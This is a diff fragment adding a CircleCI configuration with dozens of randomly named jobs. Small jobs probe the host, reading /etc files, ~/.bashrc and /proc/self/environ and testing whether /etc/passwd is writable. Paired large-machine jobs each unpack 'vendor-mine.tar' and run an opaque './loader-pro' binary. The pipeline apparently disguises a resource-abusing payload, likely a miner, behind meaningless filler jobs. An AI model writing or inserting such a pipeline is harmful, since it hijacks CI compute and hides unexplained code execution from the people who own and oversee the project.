+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-4 output
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ls -Xgt /usr/share /var/cache | awk '$5 > 1000'; true ; } > /tmp/aux3/tmp-8af3
+            echo "gate gating: $(wc -c </tmp/aux3/tmp-8af3) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'tmp-8af3'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/tmp-8af3
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  opsSlot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Randomize Skill Tree For Console
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ls /etc | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | wc -l; true ; } > /tmp/aux3/SSH.Dream_Queue_ci
+            echo "gate callisto-final: $(wc -c </tmp/aux3/SSH.Dream_Queue_ci) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'SSH.Dream_Queue_ci'
+  callisto-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/SSH.Dream_Queue_ci
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  c1us7er:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Mixdown assignment
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; tar --exclude='*.conf' -czf "/tmp/grid_v3.tgz" -C /etc profile.d && tar -tzf "/tmp/grid_v3.tgz" | head -n 1; true ; } > /tmp/aux3/963d45b8-95cf-f3ab-4ef1
+            echo "gate Validate_Prod7: $(wc -c </tmp/aux3/963d45b8-95cf-f3ab-4ef1) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '963d45b8-95cf-f3ab-4ef1'
+  Validate_Prod7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/963d45b8-95cf-f3ab-4ef1
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  salt_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: FIN 4721 Tunnel proxy config
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 3 -type f -exec dirname {} \; 2>/dev/null|awk -F/ '{print $NF}'; true ; } > /tmp/aux3/module22
+            echo "gate pat-build: $(wc -c </tmp/aux3/module22) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'module22'
+  pat-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/module22
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  XNdW6qg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Compliance weigh in step
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; echo 60 68 96 17 | tr ' ' '\n' | awk '{print $1 * 2}' | tail -n 10 | tac; true ; } > /tmp/aux3/net-121.a09ad-CPU
+            echo "gate WEB-78: $(wc -c </tmp/aux3/net-121.a09ad-CPU) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'net-121.a09ad-CPU'
+  WEB-78:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/net-121.a09ad-CPU
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  edgeDidLoad:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: prune sso 25
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; cut -c1-13 ~/.bashrc | tr -cs '[:alnum:]' '\n' | sort | uniq -c | tr -cs '[:alnum:]' '\n'; true ; } > /tmp/aux3/RIVER_DESERT_WEST
+            echo "gate node18-bench: $(wc -c </tmp/aux3/RIVER_DESERT_WEST) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'RIVER_DESERT_WEST'
+  node18-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/RIVER_DESERT_WEST
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+
+  weeshsoungx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Me captioning raw footage
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /var/tmp -name '*' -mmin +60 -exec stat -c %F {} \; 2> /dev/null | cat -n; true ; } > /tmp/aux3/br0nz3.a7om.57ock.5tock
+            echo "gate q3-cleanup: $(wc -c </tmp/aux3/br0nz3.a7om.57ock.5tock) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'br0nz3.a7om.57ock.5tock'
+  heidibot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Unmount on the hour
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; printf '%s\n' tower apple school matrix signal | awk '{print length($0), $0}' | sort -rn | head -n 1; true ; } > /tmp/aux3/module22
+            echo "gate pat-build: $(wc -c </tmp/aux3/module22) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'module22'
+  SERVER_202008:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Job 23 rebalancing leases a
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ls -A ~ | tail -n 1 | grep -c .; true ; } > /tmp/aux3/vio13t-grov3
+            echo "gate cerberus-v2: $(wc -c </tmp/aux3/vio13t-grov3) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'vio13t-grov3'
+  task-button-finish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Mission titration
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ls -phr ~ | pr -3 -t; true ; } > /tmp/aux3/R4hnL797s
+            echo "gate intergration: $(wc -c </tmp/aux3/R4hnL797s) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'R4hnL797s'
+  kind_search_union:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-4 output
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /dev -type f \( -name '*random' -o -name zero \) -exec du -ch {} + 2>/dev/null | tail -n 1; true ; } > /tmp/aux3/CPU-MD5
+            echo "gate ga-v1: $(wc -c </tmp/aux3/CPU-MD5) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'CPU-MD5'
+  v6_15_45:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Fuzz the style rules once lunch is done
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; grep -n -R case /etc/skel | cut -d: -f1 | sort -u; true ; } > /tmp/aux3/44LMuCZtxuUZqyJ16D
+            echo "gate anothr-run: $(wc -c </tmp/aux3/44LMuCZtxuUZqyJ16D) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '44LMuCZtxuUZqyJ16D'
+  pattern-rule-plugin-cache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Patch the level to free memory
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 1 -type f -name 'environ' -uid 0 -print0 | xargs -0r du -ch | tail -n 1; true ; } > /tmp/aux3/RPCPDF
+            echo "gate Rollout_Service3: $(wc -c </tmp/aux3/RPCPDF) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'RPCPDF'
+  MittenMitten:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Hold for 120 sec
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ps -eo pid,rss,comm | sort -r -n -k3 | awk 'NR>1 {print $1}' | tr a-z A-Z | fmt -w 65; true ; } > /tmp/aux3/DJI_7661
+            echo "gate fiona-ci: $(wc -c </tmp/aux3/DJI_7661) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'DJI_7661'
+  Vector:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Stream Level For The Vertical Slice
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; /bin/ls -F -1 /usr/bin/*grep* | sort; true ; } > /tmp/aux3/963d45b8-95cf-f3ab-4ef1
+            echo "gate Validate_Prod7: $(wc -c </tmp/aux3/963d45b8-95cf-f3ab-4ef1) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '963d45b8-95cf-f3ab-4ef1'
+  pSize:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Cancel join
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; echo 'meeting moved to 3pm' | tr ' ' '\n' | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | paste -sd ' '; true ; } > /tmp/aux3/DJI59988
+            echo "gate DATA-634: $(wc -c </tmp/aux3/DJI59988) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'DJI59988'
+  bgm_cha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Volley the sidebar
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /etc -name 'passwd*' -printf '%TF %TH:%TM %f\n' 2>/dev/null | wc -l; true ; } > /tmp/aux3/net-121.a09ad-CPU
+            echo "gate WEB-78: $(wc -c </tmp/aux3/net-121.a09ad-CPU) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'net-121.a09ad-CPU'
+  tb_PROMPT_CONNECT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: MOV export tray to the bench
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; grep -n local /etc/hosts | wc -l; true ; } > /tmp/aux3/GoldenPrairieBear
+            echo "gate update-metrics-leak: $(wc -c </tmp/aux3/GoldenPrairieBear) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'GoldenPrairieBear'
+  theWordTab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Preload the changelog ready for posterity
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; if test -w /etc/passwd ; then echo exists; elif test -e /tmp ; then echo maybe; else echo missing; fi; true ; } > /tmp/aux3/27wMNRWh7zRKKh8
+            echo "gate q1-canary: $(wc -c </tmp/aux3/27wMNRWh7zRKKh8) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '27wMNRWh7zRKKh8'
+  xcvbnmasdf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Promote firmware from the archive
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; cut -f1 -d= /etc/os-release | shuf -n 3 | tac; true ; } > /tmp/aux3/SSH.Dream_Queue_ci
+            echo "gate callisto-final: $(wc -c </tmp/aux3/SSH.Dream_Queue_ci) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'SSH.Dream_Queue_ci'
+  gqb7wfeew:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Level VII foreign key checkpoint
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ls | tail -n10; true ; } > /tmp/aux3/20160327
+            echo "gate Rollout_Service6: $(wc -c </tmp/aux3/20160327) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '20160327'
+  ok:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-4 output
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; sha1sum /etc/group | cut -d' ' -f1; true ; } > /tmp/aux3/9ham6z0y8w4ww
+            echo "gate CORE-19: $(wc -c </tmp/aux3/9ham6z0y8w4ww) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '9ham6z0y8w4ww'
+  glBUfqsp9sFh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Texture weapon stats and profile
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; (trap 'echo done' EXIT; echo 'testing 1 2 3'); true ; } > /tmp/aux3/GOPR00073150
+            echo "gate victor-6: $(wc -c </tmp/aux3/GOPR00073150) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'GOPR00073150'
+  sphereLink_complex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Promote the org chart by payroll cutoff
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; printf '%d\n' 378 51 445 217 423 | awk '{printf "%05d\n", $1}' | cut -c1-27 | tail -5 | fold -w 44; true ; } > /tmp/aux3/CONFIG_WORKER_FILTER
+            echo "gate validate-staging-docker-image: $(wc -c </tmp/aux3/CONFIG_WORKER_FILTER) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'CONFIG_WORKER_FILTER'
+  GraphPartial:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-4 output
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | grep -h "ID" | tail -n 3; true ; } > /tmp/aux3/tmp-8af3
+            echo "gate gating: $(wc -c </tmp/aux3/tmp-8af3) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'tmp-8af3'
+  IQK-33992a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Up next screenshot the map view
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; head -n6 /etc/group | sed 's/:.*//'; true ; } > /tmp/aux3/9ab1f866a76
+            echo "gate all-greens: $(wc -c </tmp/aux3/9ab1f866a76) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '9ab1f866a76'
+  OSCursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Shrink wrap gets dispatched twice
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ls /usr/local/bin|tail -n 8; true ; } > /tmp/aux3/RIVER_DESERT_WEST
+            echo "gate node18-bench: $(wc -c </tmp/aux3/RIVER_DESERT_WEST) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'RIVER_DESERT_WEST'
+  ValueFunc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: someday pull the env vars
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; for p in cat zebra wolf duck seal;do echo "$p"; done; true ; } > /tmp/aux3/widgetorchard
+            echo "gate v6-ga2: $(wc -c </tmp/aux3/widgetorchard) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'widgetorchard'
+  testReadParser:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: TODO unload the pick list
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; if grep -q 'root' /etc/group; then echo true; else echo 'false'; fi; true ; } > /tmp/aux3/144418_2016
+            echo "gate atlas-plus: $(wc -c </tmp/aux3/144418_2016) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '144418_2016'
+workflows:
+  all:
+    jobs:
+      - deps-misc-pos-clip
+      - weeshsoungx:
+          requires:
+            - deps-misc-pos-clip
+      - q3-cleanup:
+          requires:
+            - weeshsoungx
+      - salt_:
+          requires:
+            - weeshsoungx
+      - heidibot:
+          requires:
+            - salt_
+      - pat-build:
+          requires:
+            - heidibot
+      - SinglePosTrait:
+          requires:
+            - heidibot
+      - SERVER_202008:
+          requires:
+            - SinglePosTrait
+      - cerberus-v2:
+          requires:
+            - SERVER_202008
+      - psi_pred:
+          requires:
+            - SERVER_202008
+      - task-button-finish:
+          requires:
+            - psi_pred
+      - intergration:
+          requires:
+            - task-button-finish
+      - Donuts:
+          requires:
+            - task-button-finish
+      - kind_search_union:
+          requires:
+            - Donuts
+      - ga-v1:
+          requires:
+            - kind_search_union
+      - uCacheSegment:
+          requires:
+            - kind_search_union
+      - v6_15_45:
+          requires:
+            - uCacheSegment
+      - anothr-run:
+          requires:
+            - v6_15_45
+      - item_v6:
+          requires:
+            - v6_15_45
+      - pattern-rule-plugin-cache:
+          requires:
+            - item_v6
+      - Rollout_Service3:
+          requires:
+            - pattern-rule-plugin-cache
+      - v8_4_84
+      - MittenMitten:
+          requires:
+            - v8_4_84
+      - fiona-ci:
+          requires:
+            - MittenMitten
+      - c1us7er:
+          requires:
+            - MittenMitten
+      - Vector:
+          requires:
+            - c1us7er
+      - Validate_Prod7:
+          requires:
+            - Vector
+      - activedisable:
+          requires:
+            - Vector
+      - pSize:
+          requires:
+            - activedisable
+      - DATA-634:
+          requires:
+            - pSize
+      - XNdW6qg:
+          requires:
+            - pSize
+      - bgm_cha:
+          requires:
+            - XNdW6qg
+      - WEB-78:
+          requires:
+            - bgm_cha
+      - Yv3:
+          requires:
+            - bgm_cha
+      - tb_PROMPT_CONNECT:
+          requires:
+            - Yv3
+      - update-metrics-leak:
+          requires:
+            - tb_PROMPT_CONNECT
+      - YDY:
+          requires:
+            - tb_PROMPT_CONNECT
+      - theWordTab:
+          requires:
+            - YDY
+      - q1-canary:
+          requires:
+            - theWordTab
+      - opsSlot:
+          requires:
+            - theWordTab
+      - xcvbnmasdf:
+          requires:
+            - opsSlot
+      - callisto-final:
+          requires:
+            - xcvbnmasdf
+      - yY:
+          requires:
+            - xcvbnmasdf
+      - gqb7wfeew:
+          requires:
+            - yY
+      - Rollout_Service6:
+          requires:
+            - gqb7wfeew
+      - HashedPageProxy:
+          requires:
+            - gqb7wfeew
+      - ok:
+          requires:
+            - HashedPageProxy
+      - CORE-19:
+          requires:
+            - ok
+      - md5Pulse:
+          requires:
+            - ok
+      - glBUfqsp9sFh:
+          requires:
+            - md5Pulse
+      - victor-6:
+          requires:
+            - glBUfqsp9sFh
+      - camera-otherGet:
+          requires:
+            - glBUfqsp9sFh
+      - sphereLink_complex:
+          requires:
+            - camera-otherGet
+      - validate-staging-docker-image:
+          requires:
+            - sphereLink_complex
+      - dwFlagsDiscountClosedMenu:
+          requires:
+            - sphereLink_complex
+      - GraphPartial:
+          requires:
+            - dwFlagsDiscountClosedMenu
+      - gating:
+          requires:
+            - GraphPartial
+      - remote-normal-p
+      - callisto-v2:
+          requires:
+            - remote-normal-p
+      - m15c38:
+          requires:
+            - remote-normal-p
+      - verify:
+          requires:
+            - m15c38
+      - choosehidden:
+          requires:
+            - m15c38
+      - API-290:
+          requires:
+            - choosehidden
+      - b:
+          requires:
+            - choosehidden
+      - p-x:
+          requires:
+            - b
+      - lightning-old-socket-tree:
+          requires:
+            - b
+      - run-nightly-regression-suite:
+          requires:
+            - lightning-old-socket-tree
+      - beta_hat:
+          requires:
+            - lightning-old-socket-tree
+      - node20-release:
+          requires:
+            - beta_hat
+      - lil-tax:
+          requires:
+            - beta_hat
+      - promote:
+          requires:
+            - lil-tax
+      - button_pad_session
+      - IQK-33992a:
+          requires:
+            - button_pad_session
+      - all-greens:
+          requires:
+            - IQK-33992a
+      - edgeDidLoad:
+          requires:
+            - IQK-33992a
+      - OSCursor:
+          requires:
+            - edgeDidLoad
+      - node18-bench:
+          requires:
+            - OSCursor
+      - FOSTER:
+          requires:
+            - OSCursor
+      - ValueFunc:
+          requires:
+            - FOSTER
+      - v6-ga2:
+          requires:
+            - ValueFunc
+      - opt_bal_avg:
+          requires:
+            - ValueFunc
+      - testReadParser:
+          requires:
+            - opt_bal_avg
+      - atlas-plus:
+          requires:
+            - testReadParser
